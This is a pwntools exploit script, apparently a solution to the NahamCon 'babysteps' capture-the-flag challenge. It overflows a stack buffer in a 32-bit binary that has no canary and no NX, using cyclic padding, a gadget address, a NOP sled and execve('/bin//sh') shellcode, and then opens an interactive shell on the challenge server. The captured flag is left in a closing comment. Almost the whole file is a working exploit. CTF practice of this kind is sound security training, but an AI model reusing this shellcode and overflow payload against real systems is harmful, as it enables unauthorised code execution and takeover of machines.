#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babysteps
from pwn import *

HOST, PORT = "challenge.nahamcon.com 30201".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('babysteps')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x080492d0
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73"
    + b"\x68\x68\x2f\x62\x69\x6e\x89"
    + b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
    + b"\xcd\x80\x31\xc0\x40\xcd\x80"
)
log.info(f"length: {len(shellcode)}")

ret = 0x080490ce
call_eax = 0x08049019
add_eax = 0x08049543

if args.GDB:
    pause()
io.recvuntil(b"name?", drop=True)
payload = b""
payload += cyclic_gen().get(20)
payload += p32(40)
payload += p32(0)
payload += p32(add_eax)
payload += b"\x90"*0x10
payload += shellcode

if args.GDB:
    pause()
io.sendline(payload)

io.interactive()

# flag{7d4ce4594f7511f8d7d6d0b1edd1a162}
